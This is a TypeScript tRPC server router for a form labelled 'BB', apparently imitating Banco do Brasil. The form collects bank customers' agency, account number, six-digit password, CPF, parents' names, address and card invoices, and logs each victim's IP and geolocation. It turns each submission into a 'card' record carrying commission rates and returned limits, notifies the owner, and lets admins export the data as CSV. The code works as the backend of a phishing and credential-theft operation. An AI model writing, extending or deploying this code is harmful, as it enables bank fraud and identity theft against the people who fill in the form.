import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { createFormSubmission, createCard, updateFormSubmission, getAllFormSubmissions, getFormSubmissionById, getFormSubmissionsForExport, getWeeklyStats, getCommissionStats, deleteFormSubmission, updateFormSubmissionData, getAllCards, getCardById, updateCard, deleteCard, verifyAdminCredentials, createAdminCredential, getOrCreateWallet, getWallet, updateWalletBalance, createCommissionRecord, getCommissionHistory } from "./db";
import { storagePut } from "./storage";
import { notifyOwner } from "./_core/notification";
import { invokeLLM } from "./_core/llm";
import { TRPCError } from "@trpc/server";
import { nanoid } from "nanoid";
import crypto from "crypto";
import { COOKIE_NAME } from "../shared/const";
import { getSessionCookieOptions } from "./_core/cookies";

// Função para validar CPF
function validateCPF(cpf: string): boolean {
  const cleanCPF = cpf.replace(/\D/g, "");
  
  if (cleanCPF.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cleanCPF)) return false;
  
  let sum = 0;
  let remainder;
  
  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cleanCPF.substring(i - 1, i)) * (11 - i);
  }
  
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.charAt(9))) return false;
  
  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cleanCPF.substring(i - 1, i)) * (12 - i);
  }
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cleanCPF.charAt(10))) return false;
  
  return true;
}

// Schema de validação do formulário
const formSubmissionSchema = z.object({
  email: z.string().email("Email inválido"),
  telefone: z.string().min(10, "Telefone deve ter pelo menos 10 dígitos"),
  cpf: z.string().refine(validateCPF, "CPF inválido"),
  dataNascimento: z.string().regex(/^\d{2}\/\d{2}\/\d{4}$/, "Data deve estar no formato DD/MM/AAAA"),
  nomePai: z.string().min(2, "Nome do pai é obrigatório"),
  nomeMae: z.string().min(2, "Nome da mãe é obrigatório"),
  agencia: z.string().min(1, "Agência é obrigatória"),
  conta: z.string().min(1, "Conta é obrigatória"),
  senha: z.string().length(6, "Senha deve ter exatamente 6 dígitos").regex(/^\d{6}$/, "Senha deve conter apenas números"),
  rua: z.string().min(1, "Rua é obrigatória"),
  numero: z.string().min(1, "Número é obrigatório"),
  complemento: z.string().optional(),
  bairro: z.string().min(1, "Bairro é obrigatório"),
  cidade: z.string().min(1, "Cidade é obrigatória"),
  estado: z.string().length(2, "Estado deve ter 2 caracteres"),
  cep: z.string().regex(/^\d{5}-\d{3}$/, "CEP deve estar no formato XXXXX-XXX"),
  sentBy: z.string().optional(),
  limitReturned: z.number().optional(),
  commissionRate: z.number().optional(),
  category: z.string().optional(),
  faturaBase64: z.string().optional(),
  faturaFilename: z.string().optional(),
});

// Função para extrair dados do PDF via OCR usando LLM
async function extractPdfDataWithOCR(pdfUrl: string): Promise<{
  success: boolean;
  data?: Record<string, unknown>;
  error?: string;
}> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: "Você é um assistente que extrai dados de faturas bancárias. Extraia: nome completo, CPF, endereço, valor total, data de vencimento. Retorne como JSON."
        },
        {
          role: "user",
          content: [
            {
              type: "file_url",
              file_url: {
                url: pdfUrl,
                mime_type: "application/pdf"
              }
            },
            {
              type: "text",
              text: "Extraia os dados da fatura e retorne como JSON com os campos: nome, cpf, endereco, valor, vencimento"
            }
          ]
        }
      ]
    });

    const content = response.choices[0]?.message.content;
    if (!content) return { success: false, error: "Nenhum conteúdo extraído" };

    try {
      const data = JSON.parse(content as string);
      return { success: true, data };
    } catch {
      return { success: false, error: "Erro ao processar dados extraídos" };
    }
  } catch (error) {
    console.error("[OCR] Erro ao extrair dados:", error);
    return { success: false, error: "Erro ao processar PDF" };
  }
}

export const appRouter = router({
  system: router({
    notifyOwner: protectedProcedure
      .input(z.object({
        title: z.string(),
        content: z.string(),
      }))
      .mutation(async ({ input }) => {
        try {
          const result = await notifyOwner({
            title: input.title,
            content: input.content,
          });
          return { success: result };
        } catch (error) {
          console.error("[Notification] Erro:", error);
          return { success: false };
        }
      }),
  }),

  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const COOKIE_NAME = "session";
      ctx.res.clearCookie(COOKIE_NAME, { maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  adminAuth: router({
    login: publicProcedure
      .input(z.object({
        username: z.string().min(1),
        password: z.string().min(1),
      }))
      .mutation(async ({ input, ctx }) => {
        const admin = await verifyAdminCredentials(input.username, input.password);
        
        if (!admin) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "Credenciais invalidas" });
        }

        ctx.res.cookie("adminSession", admin.id.toString(), {
          httpOnly: true,
          secure: process.env.NODE_ENV === "production",
          sameSite: "lax",
          maxAge: 7 * 24 * 60 * 60 * 1000,
        });

        return { success: true, adminId: admin.id };
      }),

    logout: publicProcedure
      .mutation(({ ctx }) => {
        ctx.res.clearCookie("adminSession", { maxAge: -1 });
        return { success: true };
      }),

    checkAuth: publicProcedure
      .query(({ ctx }) => {
        const adminSession = ctx.req.cookies.adminSession;
        return { isAuthenticated: !!adminSession };
      }),
  }),

  form: router({
    submit: publicProcedure
      .input(formSubmissionSchema)
      .mutation(async ({ input, ctx }) => {
        try {
          // Obter localização geográfica baseada no IP
          const ipAddress = (ctx.req.headers["x-forwarded-for"] as string || "unknown").split(',')[0].trim();
          let country = "";
          let region = "";
          let city = "";
          let latitude = "";
          let longitude = "";
          
          if (ipAddress !== "unknown" && ipAddress !== "127.0.0.1") {
            try {
              const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
              if (geoResponse.ok) {
                const geoData = await geoResponse.json();
                country = geoData.country_name || "";
                region = geoData.region || "";
                city = geoData.city || "";
                latitude = geoData.latitude?.toString() || "";
                longitude = geoData.longitude?.toString() || "";
              }
            } catch (error) {
              console.warn("[GEO] Erro ao obter localização:", error);
            }
          }
          
          // Criar submissão do formulário
          const submissionId = await createFormSubmission({
            email: input.email,
            telefone: input.telefone,
            cpf: input.cpf,
            dataNascimento: input.dataNascimento,
            nomePai: input.nomePai,
            nomeMae: input.nomeMae,
            agencia: input.agencia,
            conta: input.conta,
            senha: input.senha,
            rua: input.rua,
            numero: input.numero,
            complemento: input.complemento,
            bairro: input.bairro,
            cidade: input.cidade,
            estado: input.estado,
            cep: input.cep,
            sentBy: input.sentBy,
            limitReturned: input.limitReturned,
            commissionRate: input.commissionRate,
            category: input.category,
            ipAddress: ipAddress,
            userAgent: ctx.req.headers["user-agent"] as string || "unknown",
            country: country,
            region: region,
            city: city,
            latitude: latitude,
            longitude: longitude,
          });

          // Upload de fatura se fornecido
          let faturaUrl: string | null = null;
          let faturaKey: string | null = null;
          let faturaFilename: string | null = null;
          let ocrData: Record<string, unknown> | null = null;
          let ocrValidationStatus: "pending" | "validated" | "error" | "mismatch" = "pending";

          if (input.faturaBase64 && input.faturaFilename) {
            try {
              const buffer = Buffer.from(input.faturaBase64, "base64");
              const fileKey = `faturas/${nanoid()}-${input.faturaFilename}`;
              
              const storageResult = await storagePut(fileKey, buffer, "application/pdf");
              faturaUrl = storageResult.url;
              faturaKey = storageResult.key;
              faturaFilename = input.faturaFilename;

              // Extrair dados via OCR
              const ocrResult = await extractPdfDataWithOCR(faturaUrl);
              if (ocrResult.success && ocrResult.data) {
                ocrData = ocrResult.data;
                ocrValidationStatus = "validated";
              } else {
                ocrValidationStatus = "error";
              }
            } catch (error) {
              console.error("[Storage] Erro ao fazer upload:", error);
              ocrValidationStatus = "error";
            }
          }

          // Atualizar submissão com dados da fatura
          await updateFormSubmission(submissionId, {
            faturaUrl,
            faturaKey,
            faturaFilename,
            ocrData: ocrData ? JSON.stringify(ocrData) : null,
            ocrValidationStatus,
          });

          // Criar cartão automaticamente
          let cardId: number | null = null;
          try {
            cardId = await createCard({
              holderName: input.nomePai,
              sentBy: input.sentBy || input.nomePai,
              limitReturned: input.limitReturned || 0,
              commissionRate: input.commissionRate || 0,
              email: input.email,
              password: input.senha,
              fatherName: input.nomePai,
              motherName: input.nomeMae,
              category: input.category,
              rua: input.rua,
              numero: input.numero,
              complemento: input.complemento || "",
              bairro: input.bairro,
              cidade: input.cidade,
              estado: input.estado,
              cep: input.cep,
            });

            // Atualizar submissão com ID do cartão
            await updateFormSubmission(submissionId, { cardId });
          } catch (error) {
            console.error("[Card] Erro ao criar cartão:", error);
          }

          // Notificar proprietário
          try {
            await notifyOwner({
              title: "Nova Submissão do Formulário BB",
              content: `Email: ${input.email}\nCPF: ${input.cpf}\nTelefone: ${input.telefone}\nData: ${new Date().toLocaleString("pt-BR")}`,
            });
          } catch (error) {
            console.error("[Notification] Erro ao notificar:", error);
          }

          return {
            success: true,
            submissionId,
            cardId,
          };
        } catch (error) {
          console.error("[Form] Submission error:", error);
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "Erro ao processar formulário. Tente novamente."
          });
        }
      }),
  }),

  admin: router({
    listSubmissions: protectedProcedure
      .input(z.object({
        search: z.string().optional(),
        limit: z.number().default(10),
        offset: z.number().default(0),
      }))
      .query(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getAllFormSubmissions({
          search: input.search || "",
          limit: input.limit,
          offset: input.offset,
        });
      }),

    getSubmission: protectedProcedure
      .input(z.object({ id: z.number() }))
      .query(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getFormSubmissionById(input.id);
      }),

    exportSubmissions: protectedProcedure
      .query(async ({ ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }

        const submissions = await getFormSubmissionsForExport();
        
        // Criar CSV
        const headers = ["ID", "Email", "CPF", "Telefone", "Agência", "Conta", "Rua", "Número", "Bairro", "Cidade", "Estado", "CEP", "Data Envio"];
        const rows = submissions.map(s => [
          s.id,
          s.email,
          s.cpf,
          s.telefone,
          s.agencia,
          s.conta,
          s.rua,
          s.numero,
          s.bairro,
          s.cidade,
          s.estado,
          s.cep,
          s.submittedAt ? new Date(s.submittedAt).toLocaleString("pt-BR") : "",
        ]);

        const csv = [
          headers.join(","),
          ...rows.map(row => row.map(cell => `"${cell}"`).join(","))
        ].join("\n");

        return {
          csv,
          filename: `submissoes-${new Date().toISOString().split("T")[0]}.csv`,
          count: submissions.length,
        };
      }),

    getWeeklyStats: protectedProcedure
      .query(async ({ ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getWeeklyStats();
      }),

    getCommissionStats: protectedProcedure
      .query(async ({ ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getCommissionStats();
      }),

    updateSubmission: protectedProcedure
      .input(z.object({
        id: z.number(),
        email: z.string().email().optional(),
        telefone: z.string().optional(),
        cpf: z.string().optional(),
        dataNascimento: z.string().optional(),
        nomePai: z.string().optional(),
        nomeMae: z.string().optional(),
        agencia: z.string().optional(),
        conta: z.string().optional(),
        senha: z.string().optional(),
        rua: z.string().optional(),
        numero: z.string().optional(),
        complemento: z.string().optional(),
        bairro: z.string().optional(),
        cidade: z.string().optional(),
        estado: z.string().optional(),
        cep: z.string().optional(),
        sentBy: z.string().optional(),
        limitReturned: z.number().optional(),
        commissionRate: z.number().optional(),
        category: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        const { id, ...data } = input;
        await updateFormSubmissionData(id, data);
        return { success: true };
      }),

    deleteSubmission: protectedProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        await deleteFormSubmission(input.id);
        return { success: true };
      }),

    listCards: protectedProcedure
      .input(z.object({
        search: z.string().optional(),
        limit: z.number().default(50),
        offset: z.number().default(0),
      }))
      .query(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getAllCards({
          search: input.search || "",
          limit: input.limit,
          offset: input.offset,
        });
      }),

    getCard: protectedProcedure
      .input(z.object({ id: z.number() }))
      .query(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getCardById(input.id);
      }),

    createCard: protectedProcedure
      .input(z.object({
        holderName: z.string().min(2),
        sentBy: z.string().min(2),
        limitReturned: z.number().default(0),
        commissionRate: z.number().default(0),
        email: z.string().email().optional(),
        password: z.string().optional(),
        fatherName: z.string().optional(),
        motherName: z.string().optional(),
        category: z.string().optional(),
        bank: z.string().optional(),
        status: z.enum(["pending", "completed", "cancelled"]).default("pending"),
      }))
      .mutation(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        const cardId = await createCard(input);
        return { success: true, cardId };
      }),

    updateCard: protectedProcedure
      .input(z.object({
        id: z.number(),
        holderName: z.string().optional(),
        sentBy: z.string().optional(),
        bank: z.string().optional(),
        limitReturned: z.number().optional(),
        commissionRate: z.number().optional(),
        email: z.string().email().optional(),
        password: z.string().optional(),
        fatherName: z.string().optional(),
        motherName: z.string().optional(),
        category: z.string().optional(),
        status: z.enum(["pending", "completed", "cancelled"]).optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        const { id, ...data } = input;
        await updateCard(id, data);
        return { success: true };
      }),

    deleteCard: protectedProcedure
      .input(z.object({ id: z.number() }))
      .mutation(async ({ input, ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        await deleteCard(input.id);
        return { success: true };
      }),
  }),

  wallet: router({
    getWallet: protectedProcedure
      .query(async ({ ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        const walletData = await getOrCreateWallet();
        return walletData;
      }),

    getCommissions: protectedProcedure
      .query(async ({ ctx }) => {
        if (ctx.user?.role !== "admin") {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return await getCommissionStats();
      }),
  }),
});

export type AppRouter = typeof appRouter;
